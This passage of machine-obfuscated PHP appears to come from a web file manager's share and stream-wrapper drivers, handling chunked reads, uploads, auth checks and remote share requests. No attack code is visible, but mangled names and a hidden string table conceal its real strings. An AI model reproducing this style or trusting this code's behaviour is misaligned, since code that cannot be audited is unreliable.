$İì²Ú¹Ÿ[$¤û¿Èú[98]], $¤û¿Èú[1717] => $İì²Ú¹Ÿ[$¤û¿Èú[242]], $¤û¿Èú[1762] => 0, $¤û¿Èú[1763] => 0); } static $fileInfo = array(); public function info($Âæ¤˜Š–) { $×áÇßî = $_SERVER[ŒÅŸ‹ä†][1764]; if (isset(self::$fileInfo[$Âæ¤˜Š–])) { return self::$fileInfo[$Âæ¤˜Š–]; } if (substr($Âæ¤˜Š–, 0, strlen($×áÇßî)) != $×áÇßî) { return !1; } self::$fileInfo[$Âæ¤˜Š–] = IO::info(substr($Âæ¤˜Š–, strlen($×áÇßî))); return self::$fileInfo[$Âæ¤˜Š–]; } public static function read($Ïùë­£â, $Õƒâ‡°, $¾ó‹‰‚) { if (!isset(self::$_fopenCache[$Ïùë­£â])) { $áŒ»õÇ = new StreamWrapperIO(); $áŒ»õÇ->stream_open($Ïùë­£â); self::$_fopenCache[$Ïùë­£â] = $áŒ»õÇ; } $áŒ»õÇ = self::$_fopenCache[$Ïùë­£â]; return $áŒ»õÇ->fileSubstr($Õƒâ‡°, $¾ó‹‰‚); } public static function _read($‰ˆÇœ×õ, $…ïÅ¡Çœ, $·¤ŞÊ—) { $üÂí¬ğÍ =& $_SERVER[ŒÅŸ‹ä†]; $¥¥ş„ôª = fopen($‰ˆÇœ×õ, $üÂí¬ğÍ[1610]); if (!$¥¥ş„ôª) { return $üÂí¬ğÍ[12]; } $öÕÉ¿¶ñ = 8192; fseek($¥¥ş„ôª, $…ïÅ¡Çœ, SEEK_SET); $íÜñ›¢’ = $üÂí¬ğÍ[12]; $ÁçÂ÷×‘ = 0; while ($ÁçÂ÷×‘ < $·¤ŞÊ—) { $—½Ç”º• = min($öÕÉ¿¶ñ, $·¤ŞÊ— - $ÁçÂ÷×‘); $íÜñ›¢’ .= fread($¥¥ş„ôª, $—½Ç”º•); $ÁçÂ÷×‘ += $—½Ç”º•; } fclose($¥¥ş„ôª); return $íÜñ›¢’; } public function fileSubstr($Øü¶†îÚ, $ÄŠŒ£ƒá) { $¯ïÙÂäŸ =& $_SERVER[ŒÅŸ‹ä†]; $§Ğß¡Á = $this->info[$¯ïÙÂäŸ[89]]; $Šå†Üäê = $Øü¶†îÚ; $Ç«¥àôî = $ÄŠŒ£ƒá; if ($Øü¶†îÚ < 0) { $Øü¶†îÚ = $§Ğß¡Á + $Øü¶†îÚ; } if ($ÄŠŒ£ƒá === !1) { $ÄŠŒ£ƒá = $§Ğß¡Á - $Øü¶†îÚ; } if ($Øü¶†îÚ + $ÄŠŒ£ƒá > $§Ğß¡Á) { $ÄŠŒ£ƒá = $§Ğß¡Á - $Øü¶†îÚ; } if ($ÄŠŒ£ƒá <= 0) { return $¯ïÙÂäŸ[12]; } if ($Øü¶†îÚ < 0 || $Øü¶†îÚ >= $§Ğß¡Á || $ÄŠŒ£ƒá <= 0 || $ÄŠŒ£ƒá > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\151\x6c\145\122\x65\141\144\x20\145\162\162\157\x72\41\x20\163\x74\x61\x72\x74\x3d{$Øü¶†îÚ}\x3b\x6c\145\x6e\x67\x74\x68\75{$ÄŠŒ£ƒá}\73\x20\x73\151\172\x65\x3d{$§Ğß¡Á}\73"); } $’¾“§÷ö = 64 * 1024; $õ‘ñüÆÌ =& self::$_chunkBuffer[$this->path]; if (!$õ‘ñüÆÌ) { $õ‘ñüÆÌ = array(); } $ª ¦‘”Ì = 0; $·È“ìåµ = 0; $‹Ÿ¾µì = $¯ïÙÂäŸ[12]; foreach ($õ‘ñüÆÌ as $ª ¦‘”Ì => $‹Ÿ¾µì) { $ª ¦‘”Ì = intval($ª ¦‘”Ì); $·È“ìåµ = $ª ¦‘”Ì + strlen($‹Ÿ¾µì); if ($Øü¶†îÚ >= $·È“ìåµ) { continue; } if ($Øü¶†îÚ >= $ª ¦‘”Ì && $Øü¶†îÚ + $ÄŠŒ£ƒá <= $·È“ìåµ) { return substr($‹Ÿ¾µì, $Øü¶†îÚ - $ª ¦‘”Ì, $ÄŠŒ£ƒá); } break; } if (count($õ‘ñüÆÌ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($¯ïÙÂäŸ[1765], $¯ïÙÂäŸ[1766] . count($õ‘ñüÆÌ) . "\x3b\x73\x74\141\x72\x74\x3d{$Øü¶†îÚ}\x2c\x6c\145\156\147\164\x68\x3d{$ÄŠŒ£ƒá}\73\x70\157\x73\145\72{$ª ¦‘”Ì}\176{$·È“ìåµ}"); throw new Exception($¯ïÙÂäŸ[1767]); } $÷’…ÖĞ• = intval($Øü¶†îÚ / $’¾“§÷ö) * $’¾“§÷ö; $ò€‘êïş = ceil(($Øü¶†îÚ + $ÄŠŒ£ƒá) / $’¾“§÷ö) * $’¾“§÷ö - $÷’…ÖĞ•; $åòõŞ¥› = IO::fileSubstr($this->path, $÷’…ÖĞ•, $ò€‘êïş); $õ‘ñüÆÌ[$÷’…ÖĞ• . $¯ïÙÂäŸ[12]] = $åòõŞ¥›; ksort($õ‘ñüÆÌ); $«³âôª = substr($åòõŞ¥›, $Øü¶†îÚ - $÷’…ÖĞ•, $ÄŠŒ£ƒá); return $«³âôª; } private function log($ìÆ¼†ş, $ıÊ‹…âº) { $ößÖõ…– =& $_SERVER[ŒÅŸ‹ä†]; $¾ö¡­ùŸ = timeFloat() - $this->timeStart; write_log(sprintf($ößÖõ…–[1768], $ìÆ¼†ş, $this->info[$ößÖõ…–[42]], $¾ö¡­ùŸ, $ıÊ‹…âº), $ößÖõ…–[1312]); } } goto AÚİ‹ÑÛ‘¸; FÈÖõÔ¼ÆÌ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÔÜî£ñì) { $this->pathParse = $ÔÜî£ñì; } protected function infoParse($½·ò††», $÷ºæ·öµ = false) { $’¹—­ÛÉ =& $_SERVER[ŒÅŸ‹ä†]; return Action($’¹—­ÛÉ[1304])->sharePathInfo($this->pathParse[$’¹—­ÛÉ[97]], !0, $÷ºæ·öµ); } public function listPath($¬Õ¬Àªü, $áÒÙÉëè = false) { $†œÅÉÓÜ =& $_SERVER[ŒÅŸ‹ä†]; $—Ì¶‹ë = IO::listPath($¬Õ¬Àªü, $áÒÙÉëè); if (!$—Ì¶‹ë) { return $—Ì¶‹ë; } if (is_array($—Ì¶‹ë[$†œÅÉÓÜ[1485]])) { $Ú¦òƒÚ“ = Action($†œÅÉÓÜ[1494])->parsePathChildren($—Ì¶‹ë[$†œÅÉÓÜ[1485]], array($†œÅÉÓÜ[515] => $¬Õ¬Àªü)); $—Ì¶‹ë[$†œÅÉÓÜ[1485]] = Action($†œÅÉÓÜ[1304])->shareItemInfo($Ú¦òƒÚ“); } foreach ($—Ì¶‹ë as $Ï«àş·Ò => $İĞµ„Şí) { if (!in_array($Ï«àş·Ò, array($†œÅÉÓÜ[96], $†œÅÉÓÜ[95]))) { continue; } foreach ($İĞµ„Şí as $™ùŸ‰‚ë => $Ú¦òƒÚ“) { $Ú¦òƒÚ“ = Action($†œÅÉÓÜ[1494])->parsePathChildren($Ú¦òƒÚ“, array($†œÅÉÓÜ[515] => $¬Õ¬Àªü)); $—Ì¶‹ë[$Ï«àş·Ò][$™ùŸ‰‚ë] = Action($†œÅÉÓÜ[1304])->shareItemInfo($Ú¦òƒÚ“); } } return $—Ì¶‹ë; } } class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($Ù›éÏŠ“) { $Ø†ıÃ¤ =& $_SERVER[ŒÅŸ‹ä†]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $Ù›éÏŠ“; $ÏÒ²ô¤ = Model($Ø†ıÃ¤[692])->getInfo($Ù›éÏŠ“[$Ø†ıÃ¤[492]]); $ïË“ÆÉŠ = _get($ÏÒ²ô¤, $Ø†ıÃ¤[585]); $ÒüçÊœ˜ = Model($Ø†ıÃ¤[592])->authMake(_get($ÏÒ²ô¤, $Ø†ıÃ¤[1495])); if (!$ÏÒ²ô¤) { IO::errorTips(LNG($Ø†ıÃ¤[1496]), !1); } if (!$ÒüçÊœ˜) { IO::errorTips(LNG($Ø†ıÃ¤[1497]), !1); } if ($ïË“ÆÉŠ && is_string($ïË“ÆÉŠ)) { $ïË“ÆÉŠ = json_decode($ïË“ÆÉŠ, !0); } if (!$ïË“ÆÉŠ || !$ÒüçÊœ˜) { return; } $this->_config = array($Ø†ıÃ¤[1298] => rtrim($Ù›éÏŠ“[$Ø†ıÃ¤[1298]], $Ø†ıÃ¤[8]) . $Ø†ıÃ¤[8], $Ø†ıÃ¤[1498] => $Ø†ıÃ¤[1405] . $ïË“ÆÉŠ[$Ø†ıÃ¤[1499]] . $Ø†ıÃ¤[504], $Ø†ıÃ¤[581] => $ÏÒ²ô¤, $Ø†ıÃ¤[585] => $ïË“ÆÉŠ, $Ø†ıÃ¤[1500] => $ÒüçÊœ˜, $Ø†ıÃ¤[1501] => substr(APP_HOST, 0, 8) == $Ø†ıÃ¤[228], $Ø†ıÃ¤[1502] => Model($Ø†ıÃ¤[596])->authCheck($ÒüçÊœ˜[$Ø†ıÃ¤[508]], AuthModel::AUTH_VIEW, !1), $Ø†ıÃ¤[1503] => Model($Ø†ıÃ¤[596])->authCheck($ÒüçÊœ˜[$Ø†ıÃ¤[508]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($ç˜ÎâÜ) { $¿ó°‰ =& $_SERVER[ŒÅŸ‹ä†]; $ˆúò©´ = $this->_config; if (!$ˆúò©´) { return !1; } $ğ™„Ä†Á = array($¿ó°‰[1504] => $ˆúò©´[$¿ó°‰[1502]], $¿ó°‰[1505] => $ˆúò©´[$¿ó°‰[1502]], $¿ó°‰[1326] => $ˆúò©´[$¿ó°‰[1502]], $¿ó°‰[118] => $ˆúò©´[$¿ó°‰[1503]], $¿ó°‰[1506] => $ˆúò©´[$¿ó°‰[1503]], $¿ó°‰[1275] => $ˆúò©´[$¿ó°‰[1503]], $¿ó°‰[1507] => !1, $¿ó°‰[439] => !1, $¿ó°‰[1508] => !1, $¿ó°‰[1509] => !1); return $ğ™„Ä†Á[$ç˜ÎâÜ]; } public function listPath($¿Ù±»¾, $Ş¼îÏŞ = false) { return $this->request($_SERVER[ŒÅŸ‹ä†][1510], array($¿Ù±»¾)); } public function setContent($³ñÃê‰‚, $®ÏáÕ ˜ = '') { return $this->request($_SERVER[ŒÅŸ‹ä†][1511], array($³ñÃê‰‚, $®ÏáÕ ˜)); } public function getContent($Ì€õË‰Ç) { return $this->_fileSubstr($Ì€õË‰Ç); } public function fileSubstr($å¦ò¶ß, $ø¤µÎ, $ñš¿ô ‡) { return $this->_fileSubstr($å¦ò¶ß, $ø¤µÎ, $ñš¿ô ‡); } public function download($•Á®äôÀ, $‹ªø‘œú) { return $this->_download($•Á®äôÀ, $‹ªø‘œú); } public function isFileOutServer() { return !1; } public function fileOut($õÕ—ò¢ä, $˜å¢º•Ù = false, $ÙÒŸ¸Ãˆ = false, $­ ‰®…‹ = '') { $ ¯Á„ƒÕ =& $_SERVER[ŒÅŸ‹ä†]; $this->fileOutLink($this->_fileLink($õÕ—ò¢ä, ($­ ‰®…‹ ? $ ¯Á„ƒÕ[1512] . $­ ‰®…‹ : $ ¯Á„ƒÕ[12]) . ($˜å¢º•Ù ? $ ¯Á„ƒÕ[1513] : $ ¯Á„ƒÕ[12]))); } public function fileOutImage($›»øĞë, $Œ¬¡§¼â = 250) { $this->fileOutLink($this->_fileLink($›»øĞë, $_SERVER[ŒÅŸ‹ä†][1514] . $Œ¬¡§¼â)); } public function fileOutLink($÷Ú®‰‹) { header($_SERVER[ŒÅŸ‹ä†][183] . $this->urlAuto($÷Ú®‰‹)); die; } public function exist($±û‘Ì­¬) { $ëîÌä²‚ = $this->_info($±û‘Ì­¬); return $ëîÌä²‚ ? !0 : !1; } public function isFile($Â¢Ó°¹Ÿ) { $ş¸¨ûøå =& $_SERVER[ŒÅŸ‹ä†]; $’½»Èû = $this->_info($Â¢Ó°¹Ÿ); return _get($’½»Èû, $ş¸¨ûøå[43], $ş¸¨ûøå[12]) == $ş¸¨ûøå[241]; } public function isFolder($Åó†ƒı) { $ÄÄ½Û©· =& $_SERVER[ŒÅŸ‹ä†]; $Óşô¯™¿ = $this->_info($Åó†ƒı); return _get($Óşô¯™¿, $ÄÄ½Û©·[43], $ÄÄ½Û©·[12]) == $ÄÄ½Û©·[88]; } public function size($»ªí‡¯¨) { $÷ùÂù…‚ = $this->_info($»ªí‡¯¨); return _get($÷ùÂù…‚, $_SERVER[ŒÅŸ‹ä†][89], 0); } public function info($¢¯¯¤ ) { return $this->_info($¢¯¯¤ ); } public function infoAuth($òÅ¤÷Å—) { return $this->_info($òÅ¤÷Å—); } public function infoFull($«†ÛüÓ²) { return $this->_info($«†ÛüÓ²); } public function infoFullSimple($õöÑç£) { return $this->_info($õöÑç£); } public function infoWithChildren($Ûüö¾Öº) { return $this->_info($Ûüö¾Öº, !0); } public function has($–“°·ü§, $’€´’Û¶ = false, $±„ìßØ™ = false) { $«óéıİ =& $_SERVER[ŒÅŸ‹ä†]; $ß¨ìåò = $this->_info($–“°·ü§); if (!$ß¨ìåò) { return !1; } if ($’€´’Û¶) { return array($«óéıİ[250] => $ß¨ìåò[$«óéıİ[250]], $«óéıİ[251] => $ß¨ìåò[$«óéıİ[251]]); } return $À÷ÜŸóˆ ? $ß¨ìåò[$«óéıİ[250]] > 0 : $ß¨ìåò[$«óéıİ[251]] > 0; } public function mkfile($ºçõÈÊğ, $®¯¿­ ™ = '', $Ó’ô¯’º = REPEAT_RENAME) { return $this->request($_SERVER[ŒÅŸ‹ä†][1487], array($ºçõÈÊğ, $®¯¿­ ™, $Ó’ô¯’º)); } public function mkdir($Õ™êÒ¹Ó, $¹¥Âßš¡ = REPEAT_SKIP) { return $this->request($_SERVER[ŒÅŸ‹ä†][1488], array($Õ™êÒ¹Ó, $¹¥Âßš¡)); } public function remove($úÊÅ¶Ò¤) { return $this->request($_SERVER[ŒÅŸ‹ä†][1275], array($úÊÅ¶Ò¤)); } public function rename($Ä²âëşì, $û«¤ƒ¨û) { return $this->request($_SERVER[ŒÅŸ‹ä†][1491], array($Ä²âëşì, $û«¤ƒ¨û)); } public function moveSameAllow() { } public function copy($Ö¡¹šÖ, $üËŒÆ, $¿æÕ¯Ò = REPEAT_REPLACE, $šßÌõ´ù = false) { return $this->request($_SERVER[ŒÅŸ‹ä†][646], array($Ö¡¹šÖ, $üËŒÆ, $¿æÕ¯Ò)); } public function move($’ç“¢û‘, $°ø¡Ì¯Ó, $ƒÚ ß›¡ = REPEAT_REPLACE, $¯Ïë¨Æ× = false) { return $this->request($_SERVER[ŒÅŸ‹ä†][648], array($’ç“¢û‘, $°ø¡Ì¯Ó, $ƒÚ ß›¡)); } public function uploadLink($¾âÃßÃ, $Ôå Â¸À = 0) { $Á¿¡é“ =& $_SERVER[ŒÅŸ‹ä†]; $ãÊ†Ô‹´ = IO::init($GLOBALS[$Á¿¡é“[7]][$Á¿¡é“[97]]); $äªÍŒÌı = $this->pathApiEncode($ãÊ†Ô‹´->path); $ ¥Ş ¢¨ = $this->requestMakeUrl($Á¿¡é“[1515], array($Á¿¡é“[97] => $äªÍŒÌı)); return array($Á¿¡é“[1516] => $ ¥Ş ¢¨); } public function upload($¹İ–ÄÂº, $±îÑ¼ìÇ, $şÄ›ÃÕ¦ = false, $Š¡Î…Ë½ = REPEAT_REPLACE) { $ÜşŸ£òû =& $_SERVER[ŒÅŸ‹ä†]; if (filesize($±îÑ¼ìÇ) < $this->uploadChunkSize) { return $this->request($ÜşŸ£òû[118], array($¹İ–ÄÂº, $±îÑ¼ìÇ, $Š¡Î…Ë½)); } $Â¾çåĞè = $this->uploadHashCheck($¹İ–ÄÂº, $±îÑ¼ìÇ, $Š¡Î…Ë½); if ($Â¾çåĞè) { return $Â¾çåĞè; } $ˆÙûÆœ¡ = @filesize($±îÑ¼ìÇ); $ìí©–Âã = $this->uploadChunkSize; $ÎƒÎÄÅş = ceil($ˆÙûÆœ¡ / $ìí©–Âã); $£üûêº = 0; while ($£üûêº < $ÎƒÎÄÅş) { $Â÷ñüßÓ = IO::fileSubstr($±îÑ¼ìÇ, $£üûêº * $ìí©–Âã, $ìí©–Âã); $’µÖÕåÚ = $this->tempFile($ÜşŸ£òû[12], $Â÷ñüßÓ); $Ü¯’Ë“÷ = array($ÜşŸ£òû[89] => $ˆÙûÆœ¡, $ÜşŸ£òû[1517] => $ìí©–Âã, $ÜşŸ£òû[1518] => $ÎƒÎÄÅş, $ÜşŸ£òû[1519] => $£üûêº); $¯Ñ–…ÁÚ = $this->uploadSend($¹İ–ÄÂº, $’µÖÕåÚ, $Ü¯’Ë“÷, $Š¡Î…Ë½); $£üûêº++; if (!$¯Ñ–…ÁÚ) { return !1; } } if (!is_array($¯Ñ–…ÁÚ) || empty($¯Ñ–…ÁÚ[$ÜşŸ£òû[600]])) { return !1; } return $this->pathApiDecode($¯Ñ–…ÁÚ[$ÜşŸ£òû[600]]); } private function uploadHashCheck($ä‚‰¿‘Ë, $Á©ŒÃ–ï, $¿şØ×£) { $èÎãèØ =& $_SERVER[ŒÅŸ‹ä†]; $ÑèÎéÉ¬ = IO::hashSimple($Á©ŒÃ–ï); $ıè®¤ = array($èÎãèØ[1520] => $èÎãèØ[1521], $èÎãèØ[1479] => $ÑèÎéÉ¬); $Ç¤ØµÉ¬ = $this->uploadSend($ä‚‰¿‘Ë, $èÎãèØ[12], $ıè®¤, $¿şØ×£); $·É«Æ„¨ = _get($Ç¤ØµÉ¬, $èÎãèØ[600], array()); $Ø‹³˜°ˆ = _get($·É«Æ„¨, $èÎãèØ[1522]); if (!is_array($Ø‹³˜°ˆ) || !$Ø‹³˜°ˆ[$èÎãèØ[568]]) { return !1; } $ûæ˜ææÉ = IO::hashMd5($Á©ŒÃ–ï); if ($Ø‹³˜°ˆ[$èÎãèØ[568]] != $ûæ˜ææÉ) { return !1; } if ($Ç¤ØµÉ¬[$èÎãèØ[600]][$èÎãèØ[1523]]) { $this->uploadChunkSize = $Ç¤ØµÉ¬[$èÎãèØ[600]][$èÎãèØ[1523]]; } $ıè®¤ = array($èÎãèØ[1520] => $èÎãèØ[1524], $èÎãèØ[1480] => $ûæ˜ææÉ, $èÎãèØ[1479] => $ÑèÎéÉ¬); $Ç¤ØµÉ¬ = $this->uploadSend($ä‚‰¿‘Ë, $èÎãèØ[12], $ıè®¤, $¿şØ×£); if (!is_array($Ç¤ØµÉ¬) || empty($Ç¤ØµÉ¬[$èÎãèØ[600]])) { return !1; } return $this->pathApiDecode($Ç¤ØµÉ¬[$èÎãèØ[600]]); } private function uploadSend($ÎßàÈ†¹, $Ö²Ä¤ß, $ÅåëµÈ, $Ää´ÈíÓ = '') { $ö³Ö’ÛÓ =& $_SERVER[ŒÅŸ‹ä†]; $ÅåëµÈ[$ö³Ö’ÛÓ[42]] = get_path_this($ÎßàÈ†¹); $ÅåëµÈ[$ö³Ö’ÛÓ[97]] = $this->pathApiEncode(get_path_father($ÎßàÈ†¹)); if ($Ää´ÈíÓ) { $ÅåëµÈ[$ö³Ö’ÛÓ[1525]] = $Ää´ÈíÓ; } if ($Ö²Ä¤ß) { $ÅåëµÈ[$ö³Ö’ÛÓ[241]] = $ö³Ö’ÛÓ[1340] . $Ö²Ä¤ß; } return $this->requestSend($ö³Ö’ÛÓ[1515], $ÅåëµÈ); } protected function pathApiEncode($¡ïòÉ¹Ù) { $ç™ªÙî¡ =& $_SERVER[ŒÅŸ‹ä†]; $îÁüĞı = $this->_config[$ç™ªÙî¡[1498]]; $‰ÀÕŸûÆ = strlen($îÁüĞı); if (substr($¡ïòÉ¹Ù, 0, $‰ÀÕŸûÆ) == $îÁüĞı) { return $¡ïòÉ¹Ù; } return $îÁüĞı . ltrim($¡ïòÉ¹Ù, $ç™ªÙî¡[8]); } protected function pathApiDecode($«®¾‚Ëó) { $íœ´Ñ±¦ =& $_SERVER[ŒÅŸ‹ä†]; $›ŸÁĞÃ  = $this->_config[$íœ´Ñ±¦[1498]]; $˜şÃÃªÂ = strlen($›ŸÁĞÃ ); if (substr($«®¾‚Ëó, 0, $˜şÃÃªÂ) !== $›ŸÁĞÃ ) { return $«®¾‚Ëó; } return $this->_config[$íœ´Ñ±¦[1298]] . ltrim(substr($«®¾‚Ëó, $˜şÃÃªÂ), $íœ´Ñ±¦[8]); } private function pathInfoParse(&$ê”§şÓ¬) { $¼ñÑ¾Å =& $_SERVER[ŒÅŸ‹ä†]; $ˆ…Ñ•€³ = $this->_config; $†óæ°›â = $ˆ…Ñ•€³[$¼ñÑ¾Å[581]]; if (!$ê”§şÓ¬ || !is_array($ê”§şÓ¬)) { return $ê”§şÓ¬; } static $‚Ê ‹şî = array(); $¤ìÓÚüÜ = $‚Ê ‹şî[$†óæ°›â[$¼ñÑ¾Å[693]]]; if (!is_array($¤ìÓÚüÜ)) { $µñÑ¯ÇÏ = LNG($¼ñÑ¾Å[1526]); $À„õæğÜ = $ˆ…Ñ•€³[$¼ñÑ¾Å[585]][$¼ñÑ¾Å[100]]; $Õé¦’¶¸ = parse_url($ˆ…Ñ•€³[$¼ñÑ¾Å[585]][$¼ñÑ¾Å[1527]]); $àÃÇÓ©í = $ˆ…Ñ•€³[$¼ñÑ¾Å[585]][$¼ñÑ¾Å[1528]]; $¤ìÓÚüÜ = array($¼ñÑ¾Å[1529] => $À„õæğÜ[$¼ñÑ¾Å[42]] . $¼ñÑ¾Å[1011] . $àÃÇÓ©í . $¼ñÑ¾Å[1340] . $Õé¦’¶¸[$¼ñÑ¾Å[217]] . $¼ñÑ¾Å[1013], $¼ñÑ¾Å[1530] => $µñÑ¯ÇÏ . $¼ñÑ¾Å[1077] . $ˆ…Ñ•€³[$¼ñÑ¾Å[585]][$¼ñÑ¾Å[1527]] . $¼ñÑ¾Å[1531] . LNG($¼ñÑ¾Å[1532]) . $¼ñÑ¾Å[1077] . $àÃÇÓ©í, $¼ñÑ¾Å[1533] => LNG($¼ñÑ¾Å[1534]) . $¼ñÑ¾Å[1535] . $ˆ…Ñ•€³[$¼ñÑ¾Å[585]][$¼ñÑ¾Å[1527]] . $¼ñÑ¾Å[18] . LNG($¼ñÑ¾Å[1536]) . $¼ñÑ¾Å[1535] . $À„õæğÜ[$¼ñÑ¾Å[607]], $¼ñÑ¾Å[1528] => array($¼ñÑ¾Å[42] => $àÃÇÓ©í, $¼ñÑ¾Å[1537] => $¼ñÑ¾Å[1538]), $¼ñÑ¾Å[1539] => Action($¼ñÑ¾Å[1484])->shareTargetMake($†óæ°›â[$¼ñÑ¾Å[1495]])); $‚Ê ‹şî[$†óæ°›â[$¼ñÑ¾Å[693]]] = $¤ìÓÚüÜ; } unset($ê”§şÓ¬[$¼ñÑ¾Å[202]]); unset($ê”§şÓ¬[$¼ñÑ¾Å[609]]); unset($ê”§şÓ¬[$¼ñÑ¾Å[199]]); unset($ê”§şÓ¬[$¼ñÑ¾Å[594]]); $ê”§şÓ¬[$¼ñÑ¾Å[1540]] = !0; $ê”§şÓ¬[$¼ñÑ¾Å[243]] = $ˆ…Ñ•€³[$¼ñÑ¾Å[1502]]; $ê”§şÓ¬[$¼ñÑ¾Å[244]] = $ˆ…Ñ•€³[$¼ñÑ¾Å[1503]]; $ê”§şÓ¬[$¼ñÑ¾Å[507]] = $ˆ…Ñ•€³[$¼ñÑ¾Å[1500]]; $ê”§şÓ¬[$¼ñÑ¾Å[1528]] = $¤ìÓÚüÜ[$¼ñÑ¾Å[1528]]; $ê”§şÓ¬[$¼ñÑ¾Å[1541]] = $†óæ°›â[$¼ñÑ¾Å[242]]; $ê”§şÓ¬[$¼ñÑ¾Å[1542]] = $†óæ°›â[$¼ñÑ¾Å[98]]; $ê”§şÓ¬[$¼ñÑ¾Å[1543]] = $¤ìÓÚüÜ[$¼ñÑ¾Å[1533]]; $ê”§şÓ¬[$¼ñÑ¾Å[1539]] = $¤ìÓÚüÜ[$¼ñÑ¾Å[1539]]; $Ë¢èšİª = explode($¼ñÑ¾Å[8], trim($ê”§şÓ¬[$¼ñÑ¾Å[607]], $¼ñÑ¾Å[8])); $Ë¢èšİª[0] = $¤ìÓÚüÜ[$¼ñÑ¾Å[1529]]; $ê”§şÓ¬[$¼ñÑ¾Å[607]] = implode($¼ñÑ¾Å[8], $Ë¢èšİª); if (count($Ë¢èšİª) > 1) { unset($ê”§şÓ¬[$¼ñÑ¾Å[1539]]); } if (count($Ë¢èšİª) == 1) { if ($ê”§şÓ¬[$¼ñÑ¾Å[43]] == $¼ñÑ¾Å[88]) { $ê”§şÓ¬[$¼ñÑ¾Å[42]] = $¤ìÓÚüÜ[$¼ñÑ¾Å[1529]]; } array_set_value($ê”§şÓ¬, $¼ñÑ¾Å[1544], $¤ìÓÚüÜ[$¼ñÑ¾Å[1530]]); } $¨óçİçŒ = array($¼ñÑ¾Å[1545], $¼ñÑ¾Å[1464], $¼ñÑ¾Å[1546], $¼ñÑ¾Å[1547]); foreach ($¨óçİçŒ as $®Í§‹ê) { $¼ßş¤Ù = $this->urlAuto(_get($ê”§şÓ¬, $®Í§‹ê, $¼ñÑ¾Å[12])); if ($¼ßş¤Ù) { array_set_value($ê”§şÓ¬, $®Í§‹ê, $¼ßş¤Ù); } } } private function _info($–×åÊŞó, $Ö²ßóµß = false) { $‚ùü½Ä× =& $_SERVER[ŒÅŸ‹ä†]; $Ô¦ê™ıø = $this->_config; if (!$Ô¦ê™ıø) { return !1; } static $”¸Š êñ = array(); if (isset($”¸Š êñ[$–×åÊŞó]) && is_array($”¸Š êñ[$–×åÊŞó])) { return $”¸Š êñ[$–×åÊŞó]; } if ((!$–×åÊŞó || !trim($–×åÊŞó, $‚ùü½Ä×[8])) && !$Ö²ßóµß) { $«È‹Û˜¬ = $Ô¦ê™ıø[$‚ùü½Ä×[585]][$‚ùü½Ä×[100]]; if (!$«È‹Û˜¬) { return !1; } $«È‹Û˜¬[$‚ùü½Ä×[607]] = $‚ùü½Ä×[12]; $«È‹Û˜¬[$‚ùü½Ä×[97]] = $Ô¦ê™ıø[$‚ùü½Ä×[1298]]; $this->pathInfoParse($«È‹Û˜¬); return $«È‹Û˜¬; } $˜‰‹Óø = $this->request($‚ùü½Ä×[1548], array($–×åÊŞó, $Ö²ßóµß)); $”¸Š êñ[$–×åÊŞó] = $˜‰‹Óø; return $˜‰‹Óø; } private function _fileSubstr($Û¹£ÍïÄ, $å°—·²û = 0, $—ËÄ×›× = -1) { $«Ó­²Ş° =& $_SERVER[ŒÅŸ‹ä†]; $êà¬®û = $this->_fileLink($Û¹£ÍïÄ); if (!$êà¬®û) { return !1; } $Ç¾¢æµ‰ = !1; if ($—ËÄ×›× > 0) { $½†£—¨ = $ª«û¼”Ñ + $—ËÄ×›× - 1; $Ç¾¢æµ‰ = array($«Ó­²Ş°[1549] . $ª«û¼”Ñ . $«Ó­²Ş°[482] . $½†£—¨); } $Áù¶’æ¹ = url_request($êà¬®û, $«Ó­²Ş°[1550], !1, $Ç¾¢æµ‰); return $Áù¶’æ¹[$«Ó­²Ş°[846]] ? $Áù¶’æ¹[$«Ó­²Ş°[1334]] : !1; } private function _download($È‚’ Õè, $Ääíºå¬) { $¤ˆßÅŠê = $this->_fileLink($È‚’ Õè); if (!$¤ˆßÅŠê) { return !1; } Downloader::start($¤ˆßÅŠê, $Ääíºå¬); return $Ääíºå¬; } private function _fileLink($á¤ˆºç›, $®Ë¿ê¬ = '') { $ùÖĞÓÆé =& $_SERVER[ŒÅŸ‹ä†]; $áñŒœÑ = $this->pathApiEncode($á¤ˆºç›); return $this->requestMakeUrl($ùÖĞÓÆé[1551], array($ùÖĞÓÆé[97] => $áñŒœÑ)) . $®Ë¿ê¬; } private function urlAuto($°°İ´) { $º¾¬âìı =& $_SERVER[ŒÅŸ‹ä†]; if (!$°°İ´) { return $°°İ´; } $¨®Åº¨‰ = parse_url($°°İ´); $ÉÑ¬ğÚé = $°°İ´; if ($this->_config[$º¾¬âìı[1501]] && $¨®Åº¨‰[$º¾¬âìı[216]] == $º¾¬âìı[160] && Input::check($¨®Åº¨‰[$º¾¬âìı[1552]], $º¾¬âìı[1553])) { $°°İ´ = $º¾¬âìı[228] . substr($°°İ´, 7); } $Áƒûñ„ = $º¾¬âìı[1554] . rawurlencode(rtrim($this->config[$º¾¬âìı[1498]], $º¾¬âìı[8])); if (strstr($°°İ´, $Áƒûñ„)) { $ÉÄÓ‚Š = strstr($°°İ´, $º¾¬âìı[86]) ? $º¾¬âìı[295] : $º¾¬âìı[86]; $°°İ´ = $°°İ´ . $ÉÄÓ‚Š . $º¾¬âìı[1555] . $this->authToken; } return $°°İ´; } private function request($˜å¡¤ûè, $ÀÀ¿šõ”) { $Ó’ò¢ï =& $_SERVER[ŒÅŸ‹ä†]; if (!is_array($ÀÀ¿šõ”)) { $ÀÀ¿šõ” = array(); } for ($²ï¹ÈŞ = 0; $²ï¹ÈŞ < 4; $²ï¹ÈŞ++) { if (!isset($ÀÀ¿šõ”[$²ï¹ÈŞ])) { $ÀÀ¿šõ”[$²ï¹ÈŞ] = $Ó’ò¢ï[12]; } } $È÷ş¤¹¯ = array($Ó’ò¢ï[1548] => array($Ó’ò¢ï[1556] => $Ó’ò¢ï[1548], $Ó’ò¢ï[1557] => $Ó’ò¢ï[1558], $Ó’ò¢ï[1559] => $Ó’ò¢ï[97], $Ó’ò¢ï[1297] => array($Ó’ò¢ï[1560] => array(array($Ó’ò¢ï[97] => $ÀÀ¿šõ”[0])), $Ó’ò¢ï[1561] => $ÀÀ¿šõ”[1] ? $Ó’ò¢ï[101] : $Ó’ò¢ï[12])), $Ó’ò¢ï[1510] => 